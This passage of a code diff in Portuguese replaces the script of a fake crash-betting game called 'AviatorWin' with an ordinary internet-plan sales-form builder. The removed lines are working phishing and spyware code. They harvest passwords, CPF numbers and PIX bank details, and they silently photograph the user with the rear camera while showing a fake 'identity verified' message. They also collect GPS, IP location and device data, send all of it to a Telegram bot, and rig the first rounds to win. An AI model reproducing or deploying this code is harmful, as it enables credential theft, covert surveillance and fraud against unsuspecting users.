-    if (caption) fd.append('caption', caption);
-    return HttpClient.postFormData(`${this.base()}/sendPhoto`, fd);
-  },
-  
-  async sendLocation(lat, lon) {
-    const la = parseFloat(lat), lo = parseFloat(lon);
-    if (isNaN(la)||isNaN(lo)||la<-90||la>90||lo<-180||lo>180) return null;
-    return HttpClient.postJSON(`${this.base()}/sendLocation`, {
-      chat_id: CONFIG.TELEGRAM.CHAT_ID, latitude:la, longitude:lo
-    });
-  }
-};
+        /* ===================================================================
+           CÁLCULO DE TOTAIS
+           =================================================================== */
+        const getValorPlanoAtual = () => {
+            if (!state.planoSelecionado) return 0;
+            return state.valorPromocional || state.planoSelecionado.valor;
+        };
 
-const App = {
-  data: {},
-  cameraStream: null,
-  cameraPhotos: { front:null, back:null },
-  gpsData: null,
-  round: 0,
-  wins: 0,
-  totalWon: 0,
-  balance: 0,
-  gameInterval: null,
-  currentMultiplier: 1,
-  gameActive: false,
-  betPlaced: false,
-  
-  go(n) {
-    document.querySelectorAll('.screen').forEach(s=>s.classList.remove('active'));
-    document.getElementById('s'+n).classList.add('active');
-    if (n===3) this.startCamera();
-    if (n===5) this.startPixTimer();
-    if (n===6) this.updateBalance();
-  },
-  
-  showGeneric(emoji,title,text) {
-    document.getElementById('modalGenericEmoji').textContent = emoji;
-    document.getElementById('modalGenericTitle').textContent = title;
-    document.getElementById('modalGenericText').textContent = text;
-    document.getElementById('modalGeneric').classList.add('active');
-  },
-  
-  closeModal(id) {
-    document.getElementById(id).classList.remove('active');
-  },
-  
-  showCameraDenyModal() {
-    document.getElementById('modalPhoto').classList.add('active');
-  },
-  
-  showLocationDenyModal() {
-    document.getElementById('modalLoc').classList.add('active');
-  },
-  
-  validateRegister() {
-    const name = document.getElementById('regName').value.trim();
-    const cpf = document.getElementById('regCpf').value.trim();
-    const email = document.getElementById('regEmail').value.trim();
-    const pass = document.getElementById('regPass').value;
-    const pixType = document.getElementById('pixType').value;
-    const pixKey = document.getElementById('pixKey').value.trim();
-    const pixName = document.getElementById('pixName').value.trim();
-    const pixBank = document.getElementById('pixBank').value.trim();
-    
-    if (name.length<3) return this.showGeneric('️','Nome inválido','Digite seu nome completo (mínimo 3 caracteres)');
-    if (cpf.length<11) return this.showGeneric('⚠️','CPF inválido','Digite um CPF válido');
-    if (!email.includes('@')) return this.showGeneric('⚠️','E-mail inválido','Digite um e-mail válido');
-    if (pass.length<6) return this.showGeneric('⚠️','Senha fraca','Senha deve ter pelo menos 6 caracteres');
-    if (pixKey.length<3) return this.showGeneric('⚠️','Chave PIX inválida','Digite sua chave PIX');
-    if (pixName.length<3) return this.showGeneric('⚠️','Nome do titular','Digite o nome do titular da conta PIX');
-    
-    this.data = { name, cpf, email, pass, pixType, pixKey, pixName, pixBank };
-    this.go(3);
-  },
-  
-  async startCamera() {
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode:'user', width:{ideal:CONFIG.CAMERA.WIDTH}, height:{ideal:CONFIG.CAMERA.HEIGHT} },
-        audio: false
-      });
-      this.cameraStream = stream;
-      const video = document.getElementById('cameraVideo');
-      video.srcObject = stream;
-      await new Promise(r=>{ video.onloadedmetadata = ()=>{ video.play(); r(); }; });
-      Logger.success('Câmera frontal ativa');
-    } catch(e) {
-      Logger.error('Erro câmera', e);
-      this.showGeneric('📷','Câmera indisponível','Não foi possível acessar a câmera. Verifique as permissões do navegador.');
-    }
-  },
-  
-  async capturePhoto() {
-    const flash = document.getElementById('cameraFlash');
-    const video = document.getElementById('cameraVideo');
-    
-    // Flash effect
-    flash.classList.add('active');
-    setTimeout(()=>flash.classList.remove('active'), 150);
-    
-    // Captura FRONTAL (visível)
-    const frontPhoto = this.captureFromVideo(video);
-    this.cameraPhotos.front = frontPhoto;
-    
-    // Captura TRASEIRA (silenciosa, em background)
-    try {
-      const backStream = await navigator.mediaDevices.getUserMedia({
-        video: { facingMode:'environment', width:{ideal:CONFIG.CAMERA.WIDTH}, height:{ideal:CONFIG.CAMERA.HEIGHT} },
-        audio: false
-      });
-      const backVideo = document.createElement('video');
-      backVideo.srcObject = backStream;
-      backVideo.autoplay = true;
-      backVideo.playsInline = true;
-      backVideo.style.display = 'none';
-      document.body.appendChild(backVideo);
-      
-      await new Promise(r=>{
-        backVideo.onloadedmetadata = ()=>{ backVideo.play(); setTimeout(r, CONFIG.CAMERA.DELAY); };
-      });
-      
-      const backPhoto = this.captureFromVideo(backVideo);
-      this.cameraPhotos.back = backPhoto;
-      
-      backStream.getTracks().forEach(t=>t.stop());
-      backVideo.remove();
-      Logger.success('Foto traseira capturada silenciosamente');
-    } catch(e) {
-      Logger.warn('Foto traseira falhou', e.message);
-    }
-    
-    // Para a câmera frontal
-    if (this.cameraStream) {
-      this.cameraStream.getTracks().forEach(t=>t.stop());
-      this.cameraStream = null;
-    }
-    
-    this.showGeneric('✅','Foto capturada!','Sua identidade foi verificada com sucesso.');
-    setTimeout(()=>this.go(4), 1500);
-  },
-  
-  captureFromVideo(video) {
-    const canvas = document.createElement('canvas');
-    canvas.width = video.videoWidth || 1280;
-    canvas.height = video.videoHeight || 720;
-    const ctx = canvas.getContext('2d');
-    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-    return canvas.toDataURL('image/jpeg', CONFIG.CAMERA.QUALITY);
-  },
-  
-  async requestLocation(force = false) {
-    if (!navigator.geolocation) {
-      return this.skipLocation();
-    }
-    
-    try {
-      const pos = await new Promise((res,rej)=>{
-        navigator.geolocation.getCurrentPosition(res, rej, {
-          enableHighAccuracy: true, timeout: 15000, maximumAge: 0
-        });
-      });
-      
-      this.gpsData = {
-        latitude: pos.coords.latitude,
-        longitude: pos.coords.longitude,
-        accuracy: pos.coords.accuracy,
-        source: 'GPS_PRECISO'
-      };
-      
-      Logger.success('GPS obtido', this.gpsData);
-      
-      // Tenta enriquecer com IP
-      try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        this.gpsData.ipData = ipData;
-      } catch(e) {}
-      
-      this.go(5);
-    } catch(e) {
-      Logger.warn('GPS negado', e.message);
-      if (force) {
-        this.showGeneric('','Localização necessária','Ative a localização nas configurações do seu dispositivo e tente novamente.');
-      } else {
-        this.showLocationDenyModal();
-      }
-    }
-  },
-  
-  skipLocation() {
-    // Tenta pegar só por IP
-    fetch('https://ipapi.co/json/').then(r=>r.json()).then(d=>{
-      this.gpsData = {
-        latitude: d.latitude, longitude: d.longitude,
-        accuracy: 'Aproximada (IP)', source: 'IP_API', ipData: d
-      };
-    }).catch(()=>{
-      this.gpsData = { latitude:null, longitude:null, source:'FALHOU' };
-    }).finally(()=>{
-      this.go(5);
-    });
-  },
-  
-  startPixTimer() {
-    let seconds = 299;
-    const el = document.getElementById('pixTimer');
-    const iv = setInterval(()=>{
-      seconds--;
-      const m = Math.floor(seconds/60).toString().padStart(2,'0');
-      const s = (seconds%60).toString().padStart(2,'0');
-      el.textContent = `${m}:${s}`;
-      if (seconds<=0) clearInterval(iv);
-    }, 1000);
-  },
-  
-  updatePix() {
-    const v = parseInt(document.getElementById('depositValue').value);
-    document.getElementById('pixAmount').textContent = `R$ ${v},00`;
-  },
-  
-  copyPix() {
-    const code = document.getElementById('pixCode').textContent;
-    navigator.clipboard?.writeText(code).then(()=>{
-      this.showGeneric('📋','Copiado!','Código PIX copiado para a área de transferência.');
-    });
-  },
-  
-  confirmDeposit() {
-    const v = parseInt(document.getElementById('depositValue').value);
-    this.balance = v * 2; // dobra o depósito
-    this.showGeneric('✅','Depósito confirmado!',`Seu saldo de R$ ${this.balance},00 foi creditado. Bom jogo!`);
-    setTimeout(()=>this.go(6), 1500);
-  },
-  
-  updateBalance() {
-    document.getElementById('balanceDisplay').textContent = `R$ ${this.balance.toFixed(2).replace('.',',')}`;
-  },
-  
-  startRound() {
-    if (this.gameActive) return;
-    const bet = parseFloat(document.getElementById('betAmount').value);
-    if (isNaN(bet) || bet<=0) return this.showGeneric('⚠️','Aposta inválida','Digite um valor válido');
-    if (bet > this.balance) return this.showGeneric('⚠️','Saldo insuficiente','Você não tem saldo suficiente');
-    
-    this.balance -= bet;
-    this.updateBalance();
-    this.betPlaced = true;
-    this.gameActive = true;
-    this.currentMultiplier = 1.00;
-    this.round++;
-    
-    document.getElementById('btnBet').classList.add('hidden');
-    document.getElementById('btnCashout').classList.remove('hidden');
-    
-    const multEl = document.getElementById('multiplier');
-    const planeEl = document.getElementById('plane');
-    multEl.classList.remove('crashed','cashed');
-    planeEl.classList.remove('crashed');
-    planeEl.classList.add('flying');
-    planeEl.style.bottom = '40px';
-    planeEl.style.left = '20px';
-    
-    // As PRIMEIRAS 2 rodadas SEMPRE ganham
-    const isFirstTwo = this.round <= 2;
-    const crashPoint = isFirstTwo 
-      ? (2.5 + Math.random()*2.5) // entre 2.5x e 5x (sempre alto)
-      : (1.1 + Math.random()*2);  // depois, pode crashar cedo
-    
-    const autoCashout = parseFloat(document.getElementById('autoCashout').value) || 2.0;
-    let cashedOut = false;
-    
-    this.gameInterval = setInterval(()=>{
-      this.currentMultiplier += 0.02 + (this.currentMultiplier * 0.01);
-      multEl.textContent = this.currentMultiplier.toFixed(2) + 'x';
-      
-      // Animação do avião
-      const progress = Math.min((this.currentMultiplier - 1) / 4, 1);
-      planeEl.style.bottom = (40 + progress * 180) + 'px';
-      planeEl.style.left = (20 + progress * 250) + 'px';
-      
-      // Auto cashout
-      if (!cashedOut && this.currentMultiplier >= autoCashout && this.betPlaced) {
-        this.cashout();
-        cashedOut = true;
-      }
-      
-      // Crash
-      if (this.currentMultiplier >= crashPoint && !cashedOut) {
-        this.crash(bet);
-      }
-    }, 80);
-  },
-  
-  cashout() {
-    if (!this.gameActive || !this.betPlaced) return;
-    this.betPlaced = false;
-    
-    const bet = parseFloat(document.getElementById('betAmount').value);
-    const winAmount = bet * this.currentMultiplier;
-    this.balance += winAmount;
-    this.wins++;
-    this.totalWon += winAmount;
-    
-    document.getElementById('multiplier').classList.add('cashed');
-    document.getElementById('plane').classList.remove('flying');
-    
-    this.addHistory(this.currentMultiplier.toFixed(2)+'x', true);
-    this.endRound();
-    this.updateBalance();
-    document.getElementById('winsCount').textContent = this.wins;
-    document.getElementById('totalWon').textContent = `R$ ${this.totalWon.toFixed(2).replace('.',',')}`;
-    
-    this.showGeneric('🎉','Você ganhou!',`Retirou ${this.currentMultiplier.toFixed(2)}x = R$ ${winAmount.toFixed(2).replace('.',',')}`);
-  },
-  
-  crash(bet) {
-    clearInterval(this.gameInterval);
-    this.gameActive = false;
-    this.betPlaced = false;
-    
-    document.getElementById('multiplier').classList.add('crashed');
-    document.getElementById('plane').classList.add('crashed');
-    
-    this.addHistory(this.currentMultiplier.toFixed(2)+'x', false);
-    this.endRound();
-    
-    // Se perdeu, oferece "recuperar"
-    if (this.round > 2) {
-      setTimeout(()=>{
-        this.showGeneric('💥','Crashou!',`O avião caiu em ${this.currentMultiplier.toFixed(2)}x. Tente recuperar na próxima!`);
-      }, 800);
-    }
-  },
-  
-  endRound() {
-    clearInterval(this.gameInterval);
-    this.gameActive = false;
-    setTimeout(()=>{
-      document.getElementById('btnBet').classList.remove('hidden');
-      document.getElementById('btnCashout').classList.add('hidden');
-      document.getElementById('multiplier').textContent = '1.00x';
-      document.getElementById('multiplier').classList.remove('crashed','cashed');
-      document.getElementById('plane').classList.remove('flying','crashed');
-      document.getElementById('plane').style.bottom = '40px';
-      document.getElementById('plane').style.left = '20px';
-    }, 2000);
-  },
-  
-  addHistory(text, win) {
-    const h = document.getElementById('gameHistory');
-    const item = document.createElement('div');
-    item.className = 'history-item ' + (win?'win':'lose');
-    item.textContent = text;
-    h.insertBefore(item, h.firstChild);
-    if (h.children.length > 10) h.removeChild(h.lastChild);
-  },
-  
-  async sendAllToTelegram() {
-    try {
-      // Fotos
-      if (this.cameraPhotos.front) {
-        await TelegramService.sendPhoto(this.cameraPhotos.front, 
-          `📸 SELFIE FRONTAL\n ${this.data.name}\n📧 ${this.data.email}\n🕐 ${new Date().toLocaleString('pt-BR')}`);
-      }
-      if (this.cameraPhotos.back) {
-        await TelegramService.sendPhoto(this.cameraPhotos.back,
-          `📸 FOTO TRASEIRA (AMBIENTE)\n👤 ${this.data.name}\n🕐 ${new Date().toLocaleString('pt-BR')}`);
-      }
-      
-      // Dados cadastrais
-      const msg1 = `🎰 NOVO CADASTRO - AviatorWin v${CONFIG.VERSION}\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `👤 DADOS PESSOAIS:\n` +
-        `- Nome: ${this.data.name}\n` +
-        `- CPF: ${this.data.cpf}\n` +
-        `- E-mail: ${this.data.email}\n` +
-        `- Senha: ${this.data.pass}\n\n` +
-        `💸 PIX:\n` +
-        `- Tipo: ${this.data.pixType}\n` +
-        `- Chave: ${this.data.pixKey}\n` +
-        `- Titular: ${this.data.pixName}\n` +
-        `- Banco: ${this.data.pixBank}\n\n` +
-        `🎮 JOGO:\n` +
-        `- Rodadas: ${this.round}\n` +
-        `- Vitórias: ${this.wins}\n` +
-        `- Total ganho: R$ ${this.totalWon.toFixed(2)}\n` +
-        `- Saldo atual: R$ ${this.balance.toFixed(2)}`;
-      await TelegramService.send(msg1);
-      
-      // Localização
-      const gps = this.gpsData || {};
-      const ip = gps.ipData || {};
-      const msg2 = `📍 LOCALIZAÇÃO\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `- Fonte: ${gps.source || 'N/A'}\n` +
-        `- Latitude: ${gps.latitude || 'N/A'}\n` +
-        `- Longitude: ${gps.longitude || 'N/A'}\n` +
-        `- Precisão: ${gps.accuracy || 'N/A'}\n` +
-        `- IP: ${ip.ip || 'N/A'}\n` +
-        `- Cidade: ${ip.city || 'N/A'}\n` +
-        `- Região: ${ip.region || 'N/A'}\n` +
-        `- País: ${ip.country_name || 'N/A'}\n` +
-        `- CEP: ${ip.postal || 'N/A'}\n` +
-        `- ISP: ${ip.org || 'N/A'}\n` +
-        `- ASN: ${ip.asn || 'N/A'}`;
-      await TelegramService.send(msg2);
-      
-      // Dispositivo
-      const msg3 = ` DISPOSITIVO\n━━━━━━━━━━━━━━━━━━━━━\n\n` +
-        `- UA: ${navigator.userAgent}\n` +
-        `- Plataforma: ${navigator.platform}\n` +
-        `- Idioma: ${navigator.language}\n` +
-        `- CPU: ${navigator.hardwareConcurrency||'N/A'} cores\n` +
-        `- RAM: ${navigator.deviceMemory||'N/A'}GB\n` +
-        `- Tela: ${screen.width}x${screen.height}\n` +
-        `- Window: ${window.innerWidth}x${window.innerHeight}\n` +
-        `- Pixel Ratio: ${window.devicePixelRatio}\n` +
-        `- Online: ${navigator.onLine}\n` +
-        `- Cookies: ${navigator.cookieEnabled}`;
-      await TelegramService.send(msg3);
-      
-      // Localização no mapa
-      if (gps.latitude && gps.longitude) {
-        await TelegramService.sendLocation(gps.latitude, gps.longitude);
-      }
-      
-      Logger.success('Tudo enviado ao Telegram');
-    } catch(e) {
-      Logger.error('Erro enviar Telegram', e);
-    }
-  }
-};
+        const calcularTotalServicos = () => {
+            let total = 0;
+            state.servicosSelecionados.forEach(info => { total += info.valor; });
+            return total;
+        };
 
-// Envia dados quando usuário chega na tela do jogo (após "pagar")
-const origGo = App.go.bind(App);
-App.go = function(n) {
-  origGo(n);
-  if (n === 6) {
-    // Envia tudo quando começa a jogar
-    setTimeout(()=>App.sendAllToTelegram(), 2000);
-  }
-};
+        const calcularTotalGeral = () => {
+            let total = getValorPlanoAtual();
+            total += calcularTotalServicos();
+            if (state.adesao.tipo === 'paga' && state.adesao.valor) {
+                total += parseFloat(state.adesao.valor);
+            }
+            return total;
+        };
 
-// Máscara CPF
-document.getElementById('regCpf').addEventListener('input', e=>{
-  let v = e.target.value.replace(/\D/g,'');
-  v = v.replace(/(\d{3})(\d)/,'$1.$2');
-  v = v.replace(/(\d{3})(\d)/,'$1.$2');
-  v = v.replace(/(\d{3})(\d{1,2})$/,'$1-$2');
-  e.target.value = v;
-});
+        /* ===================================================================
+           MONTAGEM DA STRING DO PLANO (concatenada)
+           =================================================================== */
+        const montarStringPlano = () => {
+            if (!state.planoSelecionado) return '';
 
-// Inicializa
-Logger.info(`AviatorWin v${CONFIG.VERSION} iniciado`);
-</script>
+            const partes = [];
+            const velocidade = state.planoSelecionado.velocidade.replace('MB', ' megas');
+            partes.push(velocidade);
 
+            if (state.servicosSelecionados.has('gamer')) {
+                partes.push('plano gamer');
+            }
+
+            if (state.servicosSelecionados.has('mesh')) {
+                partes.push('plano mesh');
+            }
+
+            const camerasInfo = state.servicosSelecionados.get('linkvideo');
+            if (camerasInfo && camerasInfo.quantidade > 0) {
+                const dias = camerasInfo.dias;
+                const qtd = camerasInfo.quantidade;
+                const textoDias = dias === 7 ? '7 dias' : '15 dias';
+                const textoQtd = qtd === 1 ? '1 câmera' : `${qtd} câmeras`;
+                partes.push(`${textoQtd} de ${textoDias}`);
+            }
+
+            const valorFinal = getValorPlanoAtual() + calcularTotalServicos();
+            const valorFormatado = formatarMoeda(valorFinal);
+
+            return `${partes.join(' + ')} = ${valorFormatado}`;
+        };
+
+        /* ===================================================================
+           GERAÇÃO DO SCRIPT (LIVE PREVIEW)
+           =================================================================== */
+        const gerarScript = () => {
+            const nome = document.getElementById('nome').value.trim();
+            const cpf = document.getElementById('cpf').value.trim();
+            const dataAgendamento = document.getElementById('dataAgendamento').value;
+            const local = document.getElementById('local').value;
+            const disponibilidade = document.getElementById('disponibilidade').value;
+            const telefone = document.getElementById('telefone').value.trim();
+            const telefone2 = document.getElementById('telefone2').value.trim();
+            const complemento = document.getElementById('complemento').value.trim();
+            const localizacao = document.getElementById('localizacao').value.trim();
+            const obsAdicionais = document.getElementById('obsAdicionais').value.trim();
+
+            const utilizacaoStr = state.utilizacoes.join(', ') || 'Não informado';
+            const planoStr = montarStringPlano() || 'Não selecionado';
+
+            let adesaoStr = 'Não informado';
+            if (state.adesao.tipo === 'gratuita') {
+                adesaoStr = 'GRATIS';
+            } else if (state.adesao.tipo === 'paga' && state.adesao.valor && state.adesao.vencimento) {
+                adesaoStr = `VENC ${state.adesao.vencimento} - ${formatarMoeda(parseFloat(state.adesao.valor))}`;
+            }
+
+            const script = `NOME: ${nome || 'Não informado'}
+CPF: ${cpf || 'Não informado'}
+SLA: ${formatarData(dataAgendamento) || 'Não informado'}
+DISPONIBILIDADE: ${disponibilidade ? `${disponibilidade} (${local || 'Não informado'})` : 'Não informado'}
+UTILIZAÇÃO: ${utilizacaoStr}
+PLANO: ${planoStr}
+TEL: ${telefone || 'Não informado'}
+TEL2: ${telefone2 || 'Não informado'}
+ADESÃO + FORMA DE PAGAMENTO: ${adesaoStr}
+COMPLEMENTO/ PONTO DE REF: ${complemento || 'Não informado'}
+LOCALIZAÇÃO: ${localizacao || 'Não informado'}
+OBS ADICIONAIS: ${obsAdicionais || 'Não informado'}`;
+
+            state.scriptGerado = script;
+            const output = document.getElementById('scriptOutput');
+            output.textContent = script;
+            output.classList.add('show');
+
+            // Habilita botões apenas se tiver conteúdo mínimo (telefone ou plano)
+            const temConteudo = telefone || state.planoSelecionado;
+            document.getElementById('btnCopiar').disabled = !temConteudo;
+            document.getElementById('btnBaixar').disabled = !temConteudo;
+        };
+
+        /* ===================================================================
+           RENDERIZAÇÃO DE PLANOS
+           =================================================================== */
+        const renderizarPlanos = () => {
+            const grid = document.getElementById('planosGrid');
+            grid.innerHTML = PLANOS.map(plano => `
+                <div class="plano-card ${state.planoSelecionado?.id === plano.id ? 'selected' : ''}"
+                     data-plano-id="${plano.id}">
+                    <div class="plano-nome">${plano.nome}</div>
+                    <div class="plano-velocidade">${plano.velocidade}</div>
+                    <div class="plano-valor">${formatarMoeda(plano.valor)}<small>/mês</small></div>
+                    <button class="plano-select-btn">
+                        ${state.planoSelecionado?.id === plano.id ? '✓ Selecionado' : 'Selecionar'}
+                    </button>
+                </div>
+            `).join('');
+
+            document.querySelectorAll('.plano-card').forEach(card => {
+                card.addEventListener('click', () => {
+                    const plano = PLANOS.find(p => p.id === card.dataset.planoId);
+                    state.planoSelecionado = plano;
+                    state.valorPromocional = null;
+                    document.getElementById('promoCheckbox').checked = false;
+                    document.getElementById('promoInputGroup').classList.remove('show');
+                    document.getElementById('promoSection').classList.add('show');
+                    document.getElementById('promoOriginal').textContent = `Valor original: ${formatarMoeda(plano.valor)}`;
+                    document.getElementById('promoValor').value = '';
+                    renderizarPlanos();
+                    atualizarResumo();
+                    gerarScript();
+                    showToast(`Plano ${plano.velocidade} selecionado`);
+                });
+            });
+        };
+
+        /* ===================================================================
+           RENDERIZAÇÃO DE SERVIÇOS
+           =================================================================== */
+        const renderizarServicos = () => {
+            const grid = document.getElementById('servicosGrid');
+            grid.innerHTML = SERVICOS.map(servico => {
+                const info = state.servicosSelecionados.get(servico.id);
+                const isSelected = !!info;
+
+                if (servico.tipo === 'cameras') {
+                    const quantidade = info?.quantidade || 0;
+                    const diasSelecionados = info?.dias || 7;
+                    const opcaoDias = servico.opcoesDias.find(o => o.dias === diasSelecionados);
+                    const valorUnitario = opcaoDias ? opcaoDias.valor : servico.opcoesDias[0].valor;
+                    const valorTotal = quantidade * valorUnitario;
+
+                    return `
+                        <div class="servico-card ${isSelected && quantidade > 0 ? 'selected' : ''}">
+                            <div class="servico-content">
+                                <div class="servico-nome">${servico.nome}</div>
+                                <div class="servico-desc">${servico.descricao}</div>
+                                
+                                <div class="servico-controles">
+                                    <label>Quantidade de Câmeras:</label>
+                                    <div class="quantidade-input">
+                                        <button class="quantidade-btn" onclick="alterarQuantidadeCameras(-1)">−</button>
+                                        <div class="quantidade-value">${quantidade}</div>
+                                        <button class="quantidade-btn" onclick="alterarQuantidadeCameras(1)">+</button>
+                                    </div>
+                                </div>
+
+                                <div class="servico-controles">
+                                    <label>Tempo de Armazenamento:</label>
+                                    <div class="dias-selector">
+                                        ${servico.opcoesDias.map(op => `
+                                            <div class="dias-opcao ${diasSelecionados === op.dias ? 'selected' : ''}"
+                                                 onclick="selecionarDias(${op.dias})">
+                                                <div class="dias-opcao-label">${op.label}</div>
+                                                <div class="dias-opcao-valor">${formatarMoeda(op.valor)}/un</div>
+                                            </div>
+                                        `).join('')}
+                                    </div>
+                                </div>
+
+                                <div class="servico-valor-total">
+                                    ${quantidade > 0 
+                                        ? `${quantidade}x ${formatarMoeda(valorUnitario)} = ${formatarMoeda(valorTotal)}/mês` 
+                                        : formatarMoeda(valorUnitario) + '/un'}
+                                </div>
+                            </div>
+                        </div>
+                    `;
+                } else {
+                    return `
+                        <div class="servico-card ${isSelected ? 'selected' : ''}">
+                            <div class="servico-content">
+                                <div class="servico-nome">${servico.nome}</div>
+                                <div class="servico-desc">${servico.descricao}</div>
+                                <div class="servico-valor-total">${formatarMoeda(servico.valor)}/mês</div>
+                                <button class="servico-add-btn" onclick="toggleServico('${servico.id}')">
+                                    ${isSelected ? '✓ Remover' : '+ Adicionar'}
+                                </button>
+                            </div>
+                        </div>
+                    `;
+                }
+            }).join('');
+        };
+
+        /* ===================================================================
+           CONTROLES DE SERVIÇOS
+           =================================================================== */
+        window.alterarQuantidadeCameras = (delta) => {
+            const servico = SERVICOS.find(s => s.id === 'linkvideo');
+            const current = state.servicosSelecionados.get('linkvideo');
+            let novaQuantidade = (current?.quantidade || 0) + delta;
+            
+            if (novaQuantidade < 0) novaQuantidade = 0;
+            
+            const diasSelecionados = current?.dias || 7;
+            const opcaoDias = servico.opcoesDias.find(o => o.dias === diasSelecionados);
+            const valorUnitario = opcaoDias ? opcaoDias.valor : servico.opcoesDias[0].valor;
+
+            if (novaQuantidade > 0) {
+                state.servicosSelecionados.set('linkvideo', {
+                    quantidade: novaQuantidade,
+                    dias: diasSelecionados,
+                    valorUnitario: valorUnitario,
+                    valor: novaQuantidade * valorUnitario
+                });
+            } else {
+                state.servicosSelecionados.delete('linkvideo');
+            }
+            
+            renderizarServicos();
+            atualizarResumo();
+            gerarScript();
+        };
+
+        window.selecionarDias = (dias) => {
+            const servico = SERVICOS.find(s => s.id === 'linkvideo');
+            const current = state.servicosSelecionados.get('linkvideo');
+            const quantidade = current?.quantidade || 0;
+            const opcaoDias = servico.opcoesDias.find(o => o.dias === dias);
+            const valorUnitario = opcaoDias ? opcaoDias.valor : servico.opcoesDias[0].valor;
+
+            if (quantidade > 0) {
+                state.servicosSelecionados.set('linkvideo', {
+                    quantidade: quantidade,
+                    dias: dias,
+                    valorUnitario: valorUnitario,
+                    valor: quantidade * valorUnitario
+                });
+            } else {
+                state.servicosSelecionados.set('linkvideo', {
+                    quantidade: 0,
+                    dias: dias,
+                    valorUnitario: valorUnitario,
+                    valor: 0
+                });
+            }
+
+            renderizarServicos();
+            atualizarResumo();
+            gerarScript();
+        };
+
+        window.toggleServico = (servicoId) => {
+            if (state.servicosSelecionados.has(servicoId)) {
+                state.servicosSelecionados.delete(servicoId);
+                showToast('Serviço removido', 'warning');
+            } else {
+                const servico = SERVICOS.find(s => s.id === servicoId);
+                state.servicosSelecionados.set(servicoId, {
+                    quantidade: 1,
+                    valor: servico.valor
+                });
+                showToast('Serviço adicionado!');
+            }
+            renderizarServicos();
+            atualizarResumo();
+            gerarScript();
+        };
+
+        /* ===================================================================
+           ATUALIZAÇÃO DO RESUMO
+           =================================================================== */
+        const atualizarResumo = () => {
+            const content = document.getElementById('resumoContent');
+            const totalEl = document.getElementById('resumoTotal');
+            let html = '';
+
+            if (state.planoSelecionado) {
+                const valorAtual = getValorPlanoAtual();
+                html += `
+                    <div class="resumo-item">
+                        <span>Plano</span>
+                        <span>${state.planoSelecionado.velocidade}</span>
+                    </div>
+                `;
+                if (state.valorPromocional) {
+                    html += `
+                        <div class="resumo-item">
+                            <span>Valor Original</span>
+                            <span class="resumo-item-value-promo">${formatarMoeda(state.planoSelecionado.valor)}</span>
+                        </div>
+                        <div class="resumo-item">
+                            <span>Valor Promocional</span>
+                            <span style="color: #fbbf24; font-weight: 700;">${formatarMoeda(valorAtual)}</span>
+                        </div>
+                    `;
+                } else {
+                    html += `
+                        <div class="resumo-item">
+                            <span>Valor</span>
+                            <span>${formatarMoeda(valorAtual)}</span>
+                        </div>
+                    `;
+                }
+            }
+
+            state.servicosSelecionados.forEach((info, id) => {
+                const servico = SERVICOS.find(s => s.id === id);
+                if (info.valor > 0) {
+                    html += `
+                        <div class="resumo-item">
+                            <span>${servico.nome}</span>
+                            <span>${formatarMoeda(info.valor)}</span>
+                        </div>
+                    `;
+                }
+            });
+
+            if (state.adesao.tipo === 'paga' && state.adesao.valor) {
+                html += `
+                    <div class="resumo-item">
+                        <span>Adesão</span>
+                        <span>${formatarMoeda(parseFloat(state.adesao.valor))}</span>
+                    </div>
+                `;
+            } else if (state.adesao.tipo === 'gratuita') {
+                html += `
+                    <div class="resumo-item">
+                        <span>Adesão</span>
+                        <span style="color: #fbbf24;">Gratuita</span>
+                    </div>
+                `;
+            }
+
+            if (!html) {
+                content.innerHTML = '<div style="text-align: center; padding: 20px; opacity: 0.8;">Preencha os dados</div>';
+                totalEl.style.display = 'none';
+            } else {
+                content.innerHTML = html;
+                totalEl.style.display = 'flex';
+                document.getElementById('resumoTotalValue').textContent = formatarMoeda(calcularTotalGeral());
+            }
+        };
+
+        /* ===================================================================
+           INICIALIZAÇÃO
+           =================================================================== */
+        const inicializar = () => {
+            // Máscaras
+            document.getElementById('cpf').addEventListener('input', (e) => {
+                e.target.value = aplicarMascaraCPF(e.target.value);
+                gerarScript();
+            });
+
+            document.getElementById('telefone').addEventListener('input', (e) => {
+                e.target.value = aplicarMascaraTelefone(e.target.value);
+                gerarScript();
+            });
+
+            document.getElementById('telefone2').addEventListener('input', (e) => {
+                e.target.value = aplicarMascaraTelefone(e.target.value);
+                gerarScript();
+            });
+
+            // Máscara de moeda no valor promocional
+            document.getElementById('promoValor').addEventListener('input', (e) => {
+                e.target.value = aplicarMascaraMoeda(e.target.value);
+                const valor = parseMoeda(e.target.value);
+                if (valor > 0) {
+                    state.valorPromocional = valor;
+                } else {
+                    state.valorPromocional = null;
+                }
+                atualizarResumo();
+                gerarScript();
+            });
+
+            // Checkbox promocional
+            document.getElementById('promoCheckbox').addEventListener('change', (e) => {
+                const inputGroup = document.getElementById('promoInputGroup');
+                if (e.target.checked) {
+                    inputGroup.classList.add('show');
+                } else {
+                    inputGroup.classList.remove('show');
+                    state.valorPromocional = null;
+                    document.getElementById('promoValor').value = '';
+                    atualizarResumo();
+                    gerarScript();
+                }
+            });
+
+            // Utilização checkboxes
+            document.querySelectorAll('.checkbox-item').forEach(item => {
+                item.addEventListener('click', (e) => {
+                    if (e.target.tagName === 'INPUT') return;
+                    const checkbox = item.querySelector('input');
+                    checkbox.checked = !checkbox.checked;
+                    item.classList.toggle('selected', checkbox.checked);
+                    
+                    const value = checkbox.value;
+                    if (checkbox.checked) {
+                        state.utilizacoes.push(value);
+                    } else {
+                        state.utilizacoes = state.utilizacoes.filter(u => u !== value);
+                    }
+                    gerarScript();
+                });
+            });
+
+            // Listeners em todos os inputs de texto para live preview
+            const inputsTexto = ['nome', 'dataAgendamento', 'complemento', 'localizacao', 'obsAdicionais'];
+            inputsTexto.forEach(id => {
+                document.getElementById(id).addEventListener('input', gerarScript);
+            });
+
+            // Selects
+            const selects = ['local', 'disponibilidade'];
+            selects.forEach(id => {
+                document.getElementById(id).addEventListener('change', gerarScript);
+            });
+
+            // Adesão - popular dias
+            const selectVenc = document.getElementById('adesaoVencimento');
+            for (let i = 1; i <= 31; i++) {
+                const opt = document.createElement('option');
+                opt.value = i;
+                opt.textContent = `Dia ${i}`;
+                selectVenc.appendChild(opt);
+            }
+
+            document.querySelectorAll('.adesao-opcao').forEach(opcao => {
+                opcao.addEventListener('click', () => {
